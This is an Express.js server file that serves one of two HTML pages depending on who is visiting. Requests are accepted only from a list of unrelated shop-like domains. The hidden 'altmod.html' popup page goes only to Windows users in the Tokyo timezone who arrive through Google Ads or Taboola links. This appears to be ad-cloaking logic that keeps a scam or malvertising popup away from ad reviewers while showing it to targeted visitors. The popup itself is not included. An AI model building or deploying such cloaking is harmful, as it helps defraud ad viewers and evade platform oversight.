const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = 3000 || process.env.PORT;

// List of allowed frontend origins for CORS
const allowedOrigins = [
  "http://127.0.0.1:5501",
  "http://127.0.0.1:5500",
  "https://ufitmerchandise.in",
  "http://ufitmerchandise.in",
  "https://eternalswater.com",
  "http://eternalswater.com",
  "https://akasakamomonoki.live",
  "http://akasakamomonoki.live",
  "https://wayneonsen.life",
  "http://wayneonsen.life",
  "https://yummyjuices.shop",
  "http://yummyjuices.shop",
  "https://sakiinstant.shop",
  "http://sakiinstant.shop",
  "https://unsng.com",
  "http://unsng.com",
];

// Normalize referer function to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// Helper function to check if the user's OS is Windows
const isWindowsOS = (userAgent) => {
  const isWindows = userAgent.includes("Windows");
  console.log(`Is Windows OS: ${isWindows}`);
  return isWindows;
};

// CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    if (allowedOrigins.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

// Apply the CORS middleware
app.use(cors(corsOptions));

// Middleware to parse JSON bodies
app.use(express.json());

// Middleware to parse URL-encoded bodies (this is no longer needed for gclid parameter in URL)
// app.use(express.urlencoded({ extended: true }));

// Route to handle the POST request
app.post(
  "/",
  (req, res) => {
    const referer = normalizeReferer(req.headers.referer);
    const userAgent = req.headers["user-agent"]; // Get the User-Agent from the request headers
    const { timezone, fullUrl } = req.body;

    console.log(req.body);
    console.log(`Referer: ${referer}, User-Agent: ${userAgent}`);
    
    // Log timezone condition
    const isTokyoTimezone = timezone === "Asia/Tokyo" || timezone === "Etc/GMT-9";
    console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);

    // Check conditions and log them, removed check for gclid
    if (isWindowsOS(userAgent) && isTokyoTimezone && (fullUrl?.includes(`gclid`) || fullUrl?.includes(`taboola`))) {
      console.log('popupsent');
      res.sendFile(path.join(__dirname, "altmod.html"));
    } else {
      console.log('popup not sent');
      res.sendFile(path.join(__dirname, "index.html"));
    }
  }
);

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
